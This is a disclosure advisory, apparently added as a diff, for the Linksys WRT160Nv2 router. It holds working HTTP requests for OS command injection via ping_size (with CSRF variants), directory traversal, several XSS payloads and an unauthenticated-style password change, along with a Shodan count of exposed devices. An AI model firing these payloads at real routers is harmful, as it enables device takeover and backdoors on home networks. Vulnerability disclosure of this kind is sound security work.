@@ -1,0 +1,187 @@
+Device Name: Linksys WRT160Nv2
+Vendor: Linksys/Cisco
+
+============ Device Description: ============ 
+
+Best For: Delivers plenty of speed and coverage, so large groups of users can go online, transfer large files, print, and stream stored media
+
+Features:
+    * Fast Wireless-N connectivity frees you to do more around your home
+    * Easy to set up and use, industrial-strength security protection
+    * Great for larger homes with many users
+
+Source: http://homestore.cisco.com/en-us/routers/Linksys-WRT160N-Wireless-N-Router-Front-Page_stcVVproductId53934616VVcatId552009VVviewprod.htm
+
+============  Vulnerable Firmware Releases: ============ 
+
+Firmware Version: v2.0.03 build 009
+
+============ Shodan Torks ============ 
+
+Shodan Search: WRT160Nv2
+	=> 4072 results
+
+============ Vulnerability Overview: ============ 
+
+* OS Command Injection
+
+	=> parameter: ping_size
+
+The vulnerability is caused by missing input validation in the ping_size parameter and can be exploited to inject and execute arbitrary shell commands. It is possible to upload and execute a backdoor to compromise the device.
+You need to be authenticated to the device or you have to find other methods for inserting the malicious commands.
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.233
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.233/Diagnostics.asp
+Authorization: Basic XXXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 181
+Connection: close
+
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=|ping%20192%2e168%2e178%2e101|&ping_times=5&traceroute_ip=
+
+Change the request methode from HTTP Post to HTTP GET makes the exploitation easier (CSRF):
+
+http://Target-IP/apply.cgi?submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=|ping%20192%2e168%2e178%2e100|&ping_times=5&traceroute_ip=
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/WRT160Nv2-OS-Command-Injection.png
+
+* Directory traversal:
+
+	=> parameter: next_page
+	
+Access local files of the device. You need to be authenticated or you have to find other methods for accessing the device.
+
+Request:
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.233
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.233/Wireless_Basic.asp
+Authorization: Basic XXXXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+
+submit_type=wsc_method2&change_action=gozila_cgi&next_page=../../proc/version
+
+Response:
+HTTP/1.1 200 Ok
+Server: httpd
+Date: Thu, 01 Jan 1970 02:53:16 GMT
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: 0
+Content-Type: text/html
+Connection: close
+
+Linux version 2.4.30 (tcy@cybertan) (gcc version 3.3.6) #9 Fri Aug 21 11:23:36 CST 2009
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/WRT160Nv2-directory-traversal.png
+
+* XSS
+
+Injecting scripts into the parameter ddns_enable, need_reboot, ping_ip and ping_size reveals that these parameters are not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.
+
+	=> Setup => DDNS
+	=> parameter ddns_enable
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.233
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.233/DDNS.asp
+Authorization: Basic XXXXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 122
+
+submit_button=DDNS&action=&change_action=gozila_cgi&submit_type=&wait_time=6&ddns_changed=&ddns_enable='%3balert('pwnd')//
+
+	=> Setup => Basic Setup
+	=> parameter need_reboot
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.233
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.233/index.asp
+Authorization: Basic XXXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 568
+
+pptp_dhcp=0&submit_button=index&change_action=&submit_type=&action=Apply&now_proto=pppoe&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot='%3balert('pwnd')//&dhcp_check=&lan_netmask_0=&lan_netmask_1=&lan_netmask_2=&lan_netmask_3=&timer_interval=30&language=EN&wan_proto=pppoe&ppp_username=pwnd&ppp_passwd=d6nw5v1x2pc7st9m&ppp_service=pwnd&ppp_demand=0&ppp_redialperiod=30&wan_hostname=pwnd&wan_domain=pwnd&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=178&lan_ipaddr_3=233&lan_netmask=255.255.255.0&lan_proto=static&time_zone=-08+1+1&_daylight_time=1
+
+	=> Administration => Diagnostics
+	=> parameter ping_ip and ping_size
+	
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.233
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.233/Diagnostics.asp
+Authorization: Basic XXXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 201
+
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1'><script>alert(2)</script>&ping_size=32'><script>alert(1)</script>&ping_times=5&traceroute_ip=
+
+It is possible that there are much more XSS Vulnerabilities in this device. I have stopped testing here ... so feel free to check more parameters for input validation problems and XSS vulnerabilities.
+
+* For changing the current password there is no request of the current password
+
+	=> parameter: http_passwd and http_passwdConfirm
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.233
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.233/Management.asp
+Authorization: Basic XXXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 250
+
+submit_button=Management&change_action=&action=Apply&PasswdModify=1&http_enable=1&https_enable=0&wait_time=4&http_passwd=admin&http_passwdConfirm=admin&_http_enable=1&web_wl_filter=0&remote_management=0&upnp_enable=1&upnp_config=1&upnp_internet_dis=0
+
+* CSRF for changing the password without knowing the current one and the attacker is able to activate the remote management:
+
+http://<IP>/apply.cgi?submit_button=Management&change_action=&action=Apply&PasswdModify=1&http_enable=1&https_enable=0&wait_time=4&http_passwd=admin&http_passwdConfirm=admin&_http_enable=1&web_wl_filter=0&remote_management=0&upnp_enable=1&upnp_config=1&upnp_internet_dis=0
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de/advisories
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+Dezember 2012 - discovered vulnerability
+23.12.2012 - Contacted Linksys and give them detailed vulnerability details
+11.02.2013 - public release
+
+===================== Advisory end =====================
